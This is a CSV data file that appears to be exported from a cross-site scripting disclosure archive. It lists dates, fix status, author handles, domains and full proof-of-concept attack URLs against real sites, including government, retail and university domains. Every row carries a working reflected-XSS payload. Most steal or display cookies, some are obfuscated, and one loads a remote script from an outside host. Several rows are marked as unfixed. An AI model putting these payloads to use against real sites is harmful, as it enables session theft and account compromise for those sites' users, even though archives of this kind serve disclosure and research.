Datesubmitted,Datepublished,Status,Author,Domain,Category,Pagerank,URL
18/08/2014,13/03/2015,UNFIXED,SquirrelBuddha,webcenters.netscape.compuserve.com,XSS,70880,"http://webcenters.netscape.compuserve.com/weather/find.jsp?f=""><script>alert(1)</script>"
05/01/2014,13/03/2015,FIXED,puritys,store.samsung.com,XSS,340,"http://store.samsung.com/uk/camera/smart-n2x""><script>alert(document.cookie)</script></nx1010-smart-camera/p/ED-LF52PL"
15/11/2013,13/03/2015,FIXED,ArianaGrande,auth.dhs.gov,XSS,4057,https://auth.dhs.gov/oam/hsinlogin/?authn_try_count=0&contextType=external&username=string&ssoCookie:max-age=3600&contextValue=%2Foam&password=sercure_string&challenge_url=%2Fhsinlogin&ssoCookie=max-age%3D3600&request_id=%27%22--%3E%3Cmarquee%3E%3Ccenter%3E%3C%2Fimg%3E%3Cbr%3E+%3Cbr%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
06/10/2014,13/03/2015,UNFIXED,MrCyph3r,www.titivillus.it,XSS,11882046,http://www.titivillus.it/periodico.php?id=15%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
09/08/2012,13/03/2015,FIXED,FabianCuchietti,www.brazzers.com,XSS,1755,http://www.brazzers.com/series/view/episodes/%22%20onmouseover%3dprompt%28%27XSS%27%29%20bad%3d%22/id/5546/bonus-episode-more-bang-for-your-buck/
12/03/2012,13/03/2015,FIXED,03storic,www-ssrl.slac.stanford.edu,XSS,866,http://www-ssrl.slac.stanford.edu/~mgeorge/webfilebrowser.php?subdir=&sortby=name&msg=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E
02/10/2014,13/03/2015,FIXED,C37HUN,touch.afisha.mail.ru,XSS,52,http://touch.afisha.mail.ru/%22%3E%3Cscript%3Ealert%28%22XSS_BY_C37HUN%22%29%3C/script%3E
01/10/2014,13/03/2015,FIXED,C37HUN,touch.tv.mail.ru,XSS,52,http://touch.tv.mail.ru/%22%3E%3Cscript%3Ealert%28%22XSS_BY_C37HUN%22%29%3C/script%3E
22/11/2013,13/03/2015,UNFIXED,NicholasLemonias,english.sinopec.com,XSS,64119,http://english.sinopec.com/investor_center/historyQuery.jsp?d=%22%20onmouseover%3dalert%28document.cookie%29%20abc%3d%22&dayend=23&daystart=23&doSearch=true&endDate=2012-03-06&gid=1&monthend=3&monthstart=3&range=1&startDate=2000-10-19&Submit2=search&yearend=1967&yearstart=1967
10/06/2014,13/03/2015,UNFIXED,M4D3RS,www.fbi.com,XSS,1431720,http://www.fbi.com/?not_found=%3Ch1%3EXSS%20BY%20Mr.M4D3RS%3C/h1%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
25/07/2012,13/03/2015,FIXED,Anonymous,ged.latribune.fr,XSS,9920,http://ged.latribune.fr/zetasearch/recherche/index.jsp?DN_SEARCH=%27%22%3E%3C/script%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E
24/03/2012,13/03/2015,FIXED,Keeper,bg.msi.com,XSS,5016,"http://bg.msi.com/service/search/?kw=%27;alert%28String.fromCharCode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29//\%22;alert%28String.fromCharCode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29%3C/SCRIPT%3E&type=product"
17/01/2014,13/03/2015,FIXED,RedToor,www.wesecure.nl,XSS,14032513,http://www.wesecure.nl/zoekresultaten/?taal=nl&zoektext=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
13/09/2012,13/03/2015,UNFIXED,tig3rhack,pti.regione.sicilia.it,XSS,50901,http://pti.regione.sicilia.it/portal/page/portal/PIR_PORTALE/PIR_LaStrutturaRegionale/PIR_AssessoratoregionaledelleRisorseAgricoleeAlimentari/PIR_DipIntStrutturali/PIR_DipIntStrutturali_News?_piref857_7105408_857_4739684_4739684.strutsAction=/thematicNews.do&month=10&stepThematicNews=month_news&thematicFilter=%22%20%3CSCRIPT%20SRC=http://ha.ckers.org/xss.js%3E%3C/SCRIPT%3E&year=2008
12/03/2015,13/03/2015,UNFIXED,0x73F,lavillette.com,XSS,431160,"http://lavillette.com/recherche/?q=<script>document.write(String.fromCharCode(60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,58,47,47,120,115,115,101,100,46,99,111,109,34,62))</script>"
06/12/2013,12/03/2015,FIXED,Vajra,www.peabody.harvard.edu,XSS,1041,https://www.peabody.harvard.edu/CMHI/detail.php?num=25&site=Yaxchilan%22%3E%3Ciframe%20onload=alert%28%27Vajra%27%29%3E&type=Lintel
13/11/2013,12/03/2015,UNFIXED,little,gmwgroup.harvard.edu,XSS,1037,http://gmwgroup.harvard.edu/techniques/index.php?topic=http://gmwgroup.harvard.edu/techniques/index.php?topic=<script>alert(document.cookie)</script>
04/08/2012,12/03/2015,FIXED,p0pc0rn,www.innovations.harvard.edu,XSS,1037,"http://www.innovations.harvard.edu/topic.html?c=26zzzzzzzzzz""><script>alert(1)</script>"
19/09/2012,12/03/2015,FIXED,AarshitMittal,pus.lcs.mit.edu,XSS,825,"http://pus.lcs.mit.edu/cgi-bin/scigen.cgi?author=%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E"
24/11/2012,12/03/2015,FIXED,Flux,www.ups.com,XSS,194,"http://www.ups.com/content/us/en/bussol/browse/cat/wireless.html?loc=en_US%22%3E%27;alert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//\%27;alert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//%22;alert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//\%22;alert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29%3C/SCRIPT%3E&viewID=categoryView&contentID=ct1_sol_cat_wireless&WT.svl=PNRO_L1"
17/02/2013,12/03/2015,FIXED,warvector,portailrh.ac-bordeaux.fr,XSS,39952,https://portailrh.ac-bordeaux.fr/login/ct_logon_mixte.jsp?CT_ORIG_URL=%2Farena%2F%22%3E%3Cscript%3Ealert%281337%29%3C/script%3E%3Ciframe%20src=http://xssed.com%3E%3C/iframe%3E
10/05/2012,12/03/2015,FIXED,FabianCuchietti,www.m86security.com,XSS,871518,http://www.m86security.com/support/search/SiteSearch.asp?query=Search...&Product=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&Page=2
22/03/2012,12/03/2015,FIXED,FabianCuchietti,renewus.avg.com,XSS,251,https://renewus.avg.com//index.php?option=com_wdshop&view=userinfo&ajax_json=ajax_fill_city_state&format=raw&zip=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
11/09/2013,12/03/2015,FIXED,DigitalBoysUnderground,channel.pandasecurity.com,XSS,14932,https://channel.pandasecurity.com/app/Pages/Partner%20Program.aspx?language=%22%3E%3C%2Fscript%3E%22%3E%27%3E%3Cscript%3Ealert%28%22Arman%20Ires%20Digital%20Boys%20Underground%20http://xssed.com%22%29%3C%2Fscript%3E
